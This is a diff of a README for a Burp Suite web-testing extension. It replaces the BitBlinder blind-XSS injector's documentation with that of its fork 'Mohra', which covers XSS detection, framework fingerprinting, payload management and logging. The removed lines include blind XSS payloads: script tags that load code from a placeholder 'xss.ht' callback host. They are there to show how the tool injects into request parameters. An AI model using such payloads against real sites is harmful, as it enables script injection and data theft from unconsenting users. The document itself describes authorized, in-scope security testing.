@@ -1,59 +1,120 @@
-# BitBlinder
+# Mohra - Advanced Web Application Testing Extension
 
-**THIS TOOLS IS IN EARLY BETA USE IT ON YOUR OWN RISK**  
-Burp extension helps in finding blind xss vulnerabilities by injecting xss payloads in every request passes throw BurpSuite
-```
-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
--  Developer: Ahmed Ezzat (BitTheByte)      -
--  Github:    https://github.com/BitTheByte -
--  Version:   0.05b                         -
-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
-[WARNING] MAKE SURE TO EDIT THE SETTINGS BEFORE USE
-[WARNING] THIS TOOL WILL WORK FOR IN-SCOPE ITEMS ONLY
-[WARNING] THIS TOOL WILL CONSUME TOO MUCH BANDWIDTH
-```
+Mohra (مهرة) is an advanced Burp Suite extension for web application testing, focusing on XSS detection and framework fingerprinting. It's a significant enhancement of the original BitBlinder extension, adding numerous features and improvements.
 
-# Configuration
-Go to `Bit blinder` tab then enable it  
-Set your payloads (line separated)  
-```
-"><script%20src="https://myusername.xss.ht"><script>
-"><script%20src="https://myusername.xss.ht"><script>
-...
-```
-If you added more than 1 payload enable the randomization button  
-If you want to keep it disabled keep in mind that the tool will use the first payload only
+## Features
 
+### Core Features
+- Framework Detection System
+  - Header-based detection
+  - Response body analysis
+  - Error pattern matching
+  - Custom framework definitions
+  - Pattern testing interface
 
-# How to use
-1. Load the extension to your burpsuite
-2. Click on `Bit blinder` tab then enable it  
-3. Add your target to scope **It'll only work for inscope items**
-4. Continue your hunting session **Make sure to do alot of actions [Forms,Search,...]**
-5. Monitor the output in extension's output tab
+- Advanced Payload Management
+  - Categorized payload system
+  - Framework-specific payloads
+  - Import from URL/GitHub/Gist
+  - File upload support
+  - Payload validation
 
-**Note:** By the nature of this tool it'll make alot of requests so you may get blocked by WAF or experience slow internet connection
+- Performance Optimization
+  - Concurrent request management
+  - Request throttling
+  - Memory usage monitoring
+  - CPU usage tracking
+  - Network bandwidth monitoring
+  - Thread pool management
 
+- Comprehensive Logging
+  - Real-time logging
+  - Advanced filtering (Level, Type, Time)
+  - Log export (CSV, JSON, HTML, TXT)
+  - Request/Response viewer
+  - Search functionality
 
-# In a nutshell
+### User Interface
+- Modern tabbed interface
+- Real-time statistics
+- Framework identifier management
+- Payload category management
+- Performance monitoring
 
-When user visits [https://example.com?vuln=123&vuln2=abc](https://example.com?vuln=123&vuln2=abc)  
-This tool will generate the following 2 requests (in the background without effecting the current session)  
-1. [https://example.com?vuln=[YOUR_XSS_PAYLOAD]&vuln2=abc](https://example.com?vuln=[YOUR_XSS_PAYLOAD]&vuln2=abc)
-2. [https://example.com?vuln=123&vuln2=[YOUR_XSS_PAYLOAD]](https://example.com?vuln=123&vuln2=[YOUR_XSS_PAYLOAD])
+## Installation
 
-The previous example also applies to `POST` parameters
+1. Download the latest release
+2. In Burp Suite, go to Extender > Extensions
+3. Click "Add" and select the downloaded jar file
+4. The extension will appear as "Mohra" in the Burp Suite tabs
 
+## Usage
 
-# Current version
-```
-Version 0.05b
-```
+### Basic Configuration
+1. Navigate to the "Scan Settings" tab
+2. Enable scanning
+3. Configure concurrent requests and delays
+4. Set memory management options
 
+### Payload Management
+1. Use the "Payload Management" tab
+2. Select or create payload categories
+3. Import payloads from various sources
+4. Validate and test payloads
 
-# TO-DO (By priority)
-- GUI ✓ ( A very ugly one for now.. )
-- Fix endless request loops ✓
-- Injection in headers
-- Option to exclude paramters/hosts/endpoints
-- Better output/logging system
+### Framework Detection
+1. Use the "Framework Identifiers" tab
+2. Configure detection patterns
+3. Test patterns against responses
+4. Add custom framework definitions
+
+### Logging and Analysis
+1. View real-time logs in the "Logs" tab
+2. Filter logs by level, type, and time
+3. Search through logs with regex support
+4. Export logs in various formats
+
+## Upcoming Features
+1. Advanced Payload Features
+   - Context-aware payload generation
+   - Payload mutation engine
+   - Success rate tracking
+
+2. Framework Detection Improvements
+   - Machine learning detection
+   - Pattern suggestions
+   - Auto-pattern generation
+
+3. Security Enhancements
+   - Input validation
+   - Output encoding
+   - Custom security rules
+
+## Credits
+
+### Original Author
+- Ahmed Ezzat (BitBlinder)
+  - GitHub: [Original BitBlinder Repository](https://github.com/BitTheByte/BitBlinder)
+
+### Current Maintainer
+- Khaled Karimeldin (xElkomy)
+  - GitHub: [https://github.com/xElkomy](https://github.com/xElkomy)
+
+## Version History
+
+### v1.0
+- Complete UI overhaul
+- Added framework detection system
+- Implemented advanced logging
+- Added performance monitoring
+- Improved payload management
+- Added request/response viewer
+
+### v0.05b (Original BitBlinder)
+- Basic XSS scanning
+- Simple payload management
+- Request handling
+
+## License
+
+This project is licensed under the MIT License - see the LICENSE file for details.
